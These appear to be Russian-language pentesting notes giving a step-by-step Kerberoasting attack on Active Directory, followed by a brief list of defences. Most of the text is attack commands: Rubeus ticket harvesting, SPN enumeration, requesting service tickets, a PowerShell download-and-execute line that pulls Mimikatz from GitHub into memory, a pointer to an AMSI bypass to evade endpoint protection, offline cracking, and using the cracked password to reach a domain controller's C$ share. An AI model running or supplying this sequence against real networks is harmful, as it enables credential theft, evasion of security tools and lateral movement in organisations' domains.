#AD #windows #attacks #privillage #kerberos

> [Kerberoasting](https://www.securitylab.ru/analytics/496049.php) – эффективный метод для извлечения служебных учетных записей из Active Directory от имени обычного пользователя и без отсылки пакетов в целевую систему

## Из-за чего возникает

Если используется Kerberos аутентификация, то любой аутентифицированный в домене пользователь может запросить TGS билет для доступа к сервису
В TGS захэширован пароль учетки от чьего имени запущен сервис
Хэш брутится оффлайн и поэтому не вызывает скачка активности на хосте

## Расширенный Kerberosting

В случае если отключена pre-auth, то есть возможна атака AS-REP Roasting, тогда мы можем без аутентификации запрашивать TGS тикеты у сервиса, если в SPN вместо krbtgt укажем SPN учетной записи на сервисе

## Использование Rubeus
Rubeus незаменим для проведения атаки Kerberoasting

Запрос TGS-билетов для всех учетных записей служб с последующим их экспортом для офлайн-взлома
```powershell
Rubeus.exe kerberoast /stats /outfile:hashes.txt
```
## Порядок действий 

1) Получение первоначального доступа
2) Командой _klist_ проверяем список доступных билетов
3) Ищем доступные SPNы различными инструментами или ps:

Учетная запись пользователя у которой назначен SPN указывает на то, что у него зарегестрирована учетная запись в этой службе
```powershell
setspn -T TestDomain -Q */*
```

4) Находим SPN учетной записи
```powershell
Get-NetUser -SPN | select samaccountname, serviceprincipalname
```

5) Запрашиваем билеты, например ps:
```powershell
Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSERVER/SQL-Server.testdomain.com:1433"
```
6) _klist_ убеждаемся, что TGS службы загружен в память
7) Mimikatz достаем его из памяти: (НО!) ЭТО ДЕТЕКТИТ EPP
Прочитать, например: [AMSI Bypass With a Null Character](http://standa-note.blogspot.com/2018/02/amsi-bypass-with-null-character.html?utm_source=Securitylab.ru).
```powershell
Invoke-Expression (New-Object Net.Webclient).downloadstring('[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps...](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1?utm_source=Securitylab.ru)')
```

8) Делаем выгрузку билетов на диск
```powershell
Invoke-Mimikatz –Command '" kerberos::list"' /export
```
9) После отправки на локальную машину начинаем брутить 
```powershell
python tgsrepcrack.py wordlist.txt 1-40a10000-Bob@MSSQLSERVER~SQL-Server.testdomain.com~1433-TESTDOMAIN.COM.kirbi
```
10) Взломав пароль просматриваем права
```powershell
net user SQLSVC /domain
```
11) Подключение за пользователя
```powershell
net group "Domain Controllers" /domain

net use \\WIN-4QHPFSI8002\c$ /user:SQLSVC Password123

dir \\WIN-4QHPFSI8002\c$
```

## Защита от атаки

1) Использование сложного пароля!!!
2) Конфигурация УЗ без привилегий
3) Индикатор атаки - Event ID 4769 (Запрос TGS)

4) FAST (Flexible Authentication Secure Tunneling) - это защищённый туннель внутри Kerberos, который шифрует аутентификацию, чтобы её нельзя было перехватить
5) Armoring - использование FAST для упаковки предварительной аутентификации в криптографический тоннель